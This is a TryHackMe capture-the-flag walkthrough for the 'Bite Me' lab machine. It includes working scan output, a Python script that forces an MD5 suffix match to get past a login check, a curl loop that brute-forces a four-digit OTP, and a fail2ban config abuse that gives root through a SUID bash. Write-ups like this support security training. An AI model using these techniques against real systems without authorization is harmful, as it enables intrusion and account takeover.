---
title: "Bite Me TryHackMe Detailed Writeup and Walkthrough"
author: "Gaurav Raj"
date: 2022-03-17 12:58:30 +530
categories: [CTF, TryHackMe]
tags:
  [
    Linux,
    TryHackMe,
    Security,
    fail2ban,
    john,
    ssh,
    python3,
    bruteforce,
    feroxbuster,
    thehackersbrain,
    gauravraj,
    gaurav raj,
    gaurav,
    writeup,
    walkthrough,
    thm,
    ctf,
    setuid,
    curl,
    Priv-Esc,
  ]
---

# Information

### Target IP

```bash
export IP=10.10.73.114
```

# Enumeration

## Nmap Scan

```bash
# Nmap 7.92 scan initiated Mon Mar 14 15:35:58 2022 as: nmap -sC -sV -A -v -oA nmap/initial 10.10.73.114
Nmap scan report for 10.10.73.114
Host is up (0.34s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 89:ec:67:1a:85:87:c6:f6:64:ad:a7:d1:9e:3a:11:94 (RSA)
|   256 7f:6b:3c:f8:21:50:d9:8b:52:04:34:a5:4d:03:3a:26 (ECDSA)
|_  256 c4:5b:e5:26:94:06:ee:76:21:75:27:bc:cd:ba:af:cc (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=3/14%OT=22%CT=1%CU=34267%PV=Y%DS=2%DC=T%G=Y%TM=622F13B
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST1
OS:1NW6%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 13.534 days (since Tue Mar  1 02:48:13 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   503.58 ms 10.8.0.1
2   503.78 ms 10.10.73.114

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 14 15:36:42 2022 -- 1 IP address (1 host up) scanned in 43.79 seconds
```

From the about **NMAP** Scan result, we get 2 open **ports**, **22 - SSH ** & **80 - HTTP**.
So first of all, we will take a look at the **HTTP** Server on port **80.**

## HTTP Enumeration

After visiting the **HTTP** Server, we can see that, this is the default **Apache2** webpage.
![](/assets/images/biteme/Pasted image 20220317193154.png)
Checking for the **HTML** Source code, for anything interesting, but no luck so far.
Now moving to the next step, we'll start a **directory busting** for any interesting files or any directories that are hidden from us.

### Directory Busting

So for this purpose alone, we have many tools available such as: **dirb**, **dirbuster**, **gobuster**, **fuff** and so much that the list may go on forever. but recently I've switched from **ffuf** to **feroxbuster**. This tools is written in **rust** and is supposed to be faster than the existing ones that we already know. so just trying it out. It all depends on your choice, which you want to use or are most comfortable with, Anyway enough talking, let's get back to our enumeration. here the scan results.

#### Feroxbuster Log

```bash
┌──(elliot@archlinux)-[~/data/biteme]-[192.168.225.72]-[]
└─$ feroxbuster -u http://10.10.135.235/

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.135.235/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      316c http://10.10.135.235/console
301        9l       28w      320c http://10.10.135.235/console/css
301        9l       28w      327c http://10.10.135.235/console/securimage
301        9l       28w      336c http://10.10.135.235/console/securimage/database
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_10_135_235_-1647525946.state ...
[#>------------------] - 1m      9588/149995  22m     found:4       errors:1019
[##>-----------------] - 1m      3740/29999   40/s    http://10.10.135.235/
[#>------------------] - 1m      2547/29999   33/s    http://10.10.135.235/console
[#>------------------] - 1m      2122/29999   28/s    http://10.10.135.235/console/css
[>-------------------] - 58s      743/29999   12/s    http://10.10.135.235/console/securimage
[>-------------------] - 49s      431/29999   8/s     http://10.10.135.235/console/securimage/database
┌──(elliot@archlinux)-[~/data/biteme]-[192.168.225.72]-[]
└─$
```

![](/assets/images/biteme/Pasted image 20220317194133.png)
Looking at the scan results, we have some intersting endpoints discovered, that we didn't knew before.

1. **/console - 301**
2. **/console/secureimages - 301**
3. **/console/secureimages/database - 301**

Let's explore and enumerate all the endpoints one by one.
![](/assets/images/biteme/Pasted image 20220317194423.png)
As we can see from the above image, **/console** endpoint have a login form, and the **/secureimage** is some **php** library for handling the **captcha** code on the login form.
After checking for default credentials and also any type of login bypass like, **Database Injection** like **SQLi** or using default credentials, nothing worked.

![](/assets/images/biteme/Pasted image 20220317194905.png)

1. while looking at the **source code** of the page, found a javascript function named **handleSubmit()**

   ```js
   function handleSubmit() {
     eval(
       (function (p, a, c, k, e, r) {
         e = function (c) {
           return c.toString(a);
         };
         if (!"".replace(/^/, String)) {
           while (c--) r[e(c)] = k[c] || e(c);
           k = [
             function (e) {
               return r[e];
             },
           ];
           e = function () {
             return "\\w+";
           };
           c = 1;
         }
         while (c--)
           if (k[c]) p = p.replace(new RegExp("\\b" + e(c) + "\\b", "g"), k[c]);
         return p;
       })(
         "0.1('2').3='4';5.6('@7 8 9 a b c d e f g h i... j');",
         20,
         20,
         "document|getElementById|clicked|value|yes|console|log|fred|I|turned|on|php|file|syntax|highlighting|for|you|to|review|jason".split(
           "|"
         ),
         0,
         {}
       )
     );
     return true;
   }
   ```

After deobfuscating the code, a bit more we found this.
![](/assets/images/biteme/Pasted image 20220317195356.png)

1. The **js** deobfuscator tool, can be found on github [here](https://lelinhtinh.github.io/de4js/)
2. Pasting in the obfuscated js code. As we can see from the obfuscated code that it is using **packer** through **eval()** function. So selecting the package in obfuscator tool.
3. Here we got the deobfuscated js code.
   ```js
   function handleSubmit() {
     document.getElementById("clicked").value = "yes";
     console.log(
       "@fred I turned on php file syntax highlighting for you to review... jason"
     );
     return true;
   }
   ```

So what the code is doing that, if any user clicks on the **submit** button of the login page, the **handleSubmit()** function will log a message in the **developer console**.
From here we got some information.

1. We have 2 users: **fred** and **jason**
2. and there is some kind of **php syntax highligher** is present on the server.

### Viewing Source Code

If we can somehow pass the **index.php** page to the **php syntax highlighter**, we can apparently see the actual source code, which is running on the server side.
Let's enumerate further and see if we can do that or we have to take any other path.

![](/assets/images/biteme/Pasted image 20220317200824.png)

1. Searching on google for **php syntax highlighter**, headed to the **php docs**.
2. Here is the **syntax highlighting** function, which take a **php** file.
3. We can pass a file with **.phps** for syntax highlighting.

So here we requested **/index.php** using **.phps** extensions and voila, we got the php code
![](/assets/images/biteme/Pasted image 20220317203116.png)
So this is the **index.php** code, which isn't much

1. **index.php** php code
2. Getting data from the login form, if submit button is clicked
3. Generating the **captcha code** and calling the **mfa.php** file, which might be interesting for us.

### Bypassing Login Form

#### Finding username

![](/assets/images/biteme/Pasted image 20220317214805.png)
here's the **functions.php** file's content

1. Source code of the **functions.php** file
2. We can see **LOGIN_USER** variable is used in the login functions, which is passed from the **config.php** file. As we can see that, **$user** variable's value is passed via **bin2hex** function, which is used to convert the **hex** data into **binary ascii** data.

   ![](/assets/images/biteme/Pasted image 20220317215235.png)

   1. Here the value of **LOGIN_USER** from **config.php** file, which is in the **hex** form.
      ![](/assets/images/biteme/Pasted image 20220317215433.png)
      here the decoded form the **LOGIN_USER**. so we have the login user **jason_test_account**.

3. From the **is_valid_pwd()** function, so the function is first retrieving the password entered in the form, converting it in **md5** hash, and checking if the last 3 characters is equal to **001**

#### Generating Password

So for bypassing the login panel, we have the **username** and for the password, we have to generate any **md5** hash which ends with **001**. So let's write a script for doing so.

genpass.py

```python
#!/usr/bin/env python3

from hashlib import md5
from string import ascii_lowercase
import itertools

counter = 1
while True:
    combinations = itertools.combinations_with_replacement(
        ascii_lowercase, r=counter)

    for i in combinations:
        string = "".join(i)

        m = md5(string.encode('utf-8'))
        the_hash = m.hexdigest()
        if (the_hash.endswith('001')):
            print("{}: {}".format(string, the_hash))
            exit()
    counter += 1
```

![](/assets/images/biteme/Pasted image 20220317220610.png)

So here's is a python script for generating a random hash which ends with **001**, as required for bypassing the login form. By now we already have the username and now we also have the password, so let's check if we login or not.

#### Bypassing OTP Verification

![](/assets/images/biteme/Pasted image 20220317221025.png)
Yay!, we successfully bypassed the login form, but we have another thing to bypass, someking of **OTP** is required to bypass the form.

By checking the source code of the **/console/mfa.php** endpoint
![](/assets/images/biteme/Pasted image 20220317221239.png)
we got another javascript deobfuscated code, which is readable.

1. It logs the message in the console

So from the image above we know that, we can simply bruteforce the **OTP** to bypass the form. Let's do it.
![](/assets/images/biteme/Pasted image 20220317230647.png)

```bash
for i in {0000..9999}; do echo $i; curl -s -X POST --data "code=$i" 10.10.95.146/console/mfa.php --cookie "user=jason_test_account; pwd=xxxxx" | wc -l | grep -v "23"; if [ $? -eq 0 ]; then echo FOUND IT!; break; fi; done
```

So here's the oneliner using which, we can apparently bypass the **OTP** verification.

and Voila, we are successfully logged in.

#### User Flag

![](/assets/images/biteme/Pasted image 20220317232659.png)
After logging in, we got 2 tabs, a **File Browser** using which, we can list the files and a **File Viewer** using that, we can read any file, which we have permission to, obviously.
![](/assets/images/biteme/Pasted image 20220317233054.png)
In the **jason** user's home directory, we found following files. contents of **/home/jason** directory.

![](/assets/images/biteme/Pasted image 20220317233335.png)
and here we got the **user flag**.

![](/assets/images/biteme/Pasted image 20220317233615.png)

1. Here we have the **/home/jason/.ssh** directory
2. we have the **id_rsa**, which we can use to get shell as user **jason** on the system.

![](/assets/images/biteme/Pasted image 20220317234033.png)

1. Accessing the **/home/jason/.ssh/id_rsa** file
2. Here's the contents of the **id_rsa** file

# Initial Access

## Getting User Shell

Now that we have the **id_rsa** file or **private ssh key** of the user **jason**, we can try login using the file.
![](/assets/images/biteme/Pasted image 20220317235120.png)

1. **jason** user's **private ssh key** file
2. Changing the permission of the file, so we can use it.
3. Trying to ssh into the machine using the **ssh key**
4. and Here we are asked for the **jason**'s password which we don't know.

### Cracking the hash

But we do have the **ssh key**, which we can pass to **johntheripper** and crack the password.

![](/assets/images/biteme/Pasted image 20220317235956.png)

1. Converting the file in a format that **john** can use
2. Cracking the hash with **john**
3. And here we got the password.

Now Let's Try and Login with the password.

![](/assets/images/biteme/Pasted image 20220318000236.png)

1. Trying to log into the server via ssh using private key and password
2. Logged in as user **jason**

And here we got the shell as user **jason**

## Privilege Escalation

### Horizontal Privilege Escalation

Checking the sudo capibilities of the user **jason**, we found that we can run any command on the system as user **fred** using the **sudo** command.

![](/assets/images/biteme/Pasted image 20220318000453.png)

1. Checking **sudo** permissions
2. Found that we can run any command as user **fred** using **sudo**
3. Executing **bash** as user **fred** using **sudo**
4. And here we have the shell as user **fred**

### Getting Root Access

#### Checking for sudo privileges

Again checking for **sudo** permissions that we have as **fred**, found that we can restart **fail2ban** using **systemctl**.

![](/assets/images/biteme/Pasted image 20220318000938.png)

1. Checking the **sudo** permissions
2. we can run **/bin/systemctl restart fail2ban** as **root** without password.

So we can restart **fail2ban** using **systemctl**. Let's check if we can somehow abuse this to get a root shell. for those who don't know what **fail2ban** is:

> Fail2Ban is an intrusion prevention software framework that protects computer servers from brute-force attacks.

After researching for a while, we found that, we can write any configuration files of the **fail2ban** service, we can modify the configurations and get a shell as root.
Let's check if we have write permissions for any of the configuration files of the **fail2ban** service.

#### Abusing fail2ban to get root shell

![](/assets/images/biteme/Pasted image 20220318002554.png)
So as we can see from the above image, that we have **write** permission to **/etc/fail2ban/action.d** directory

1. Finding files with **write** permission enabled
2. Found **/etc/fail2ban/action.d** with enabled **write** permission

Let's check if we can modify any of the configuration files.

![](/assets/images/biteme/Pasted image 20220318002823.png)

1. Here we can see that **iptables-multiport.conf** file is owned by the **fred** user, which we can abuse to get a root shell on the system.

Modifing the **iptables-multiport.conf** file for getting root access.

![](/assets/images/biteme/Pasted image 20220318003446.png)

1. Replaced the origin **actionban** command to our own.
2. Replaced the origin **actionunban** command to execute our own command.

So what this will do is, if we will try to bruteforce the **ssh** then if enough attempts is failed then the **fail2ban** service will execute the specified command in **actionban** from the **iptables-multiport.conf** file.

So let's restart the **fail2ban** service, we have the **sudo** privilege to do that, and try bruteforcing the **ssh** in order to get a root shell.

![](/assets/images/biteme/Pasted image 20220318004405.png)

1. Restarting the **fail2ban** service to load our modified configurations.
2. Bruteforcing **ssh** in order to make **fail2ban** to invoke the **actionban**
3. Checking the **/bin/bash** for **SUID** bit
4. And here, we have a **SUID** bit set to the **/bin/bash** binary

#### Root Shell

![](/assets/images/biteme/Pasted image 20220318004833.png)

1. Invoking the **SUID** bit of the **/bin/bash** binary
2. Got shell as **root** user
3. Reading the root flag

So here we completed our machine, hope you all liked it.
Thanks for reading and don't forget to share if you liked, and we will see you again until then **Keep Calm and Keep Hacking :)**
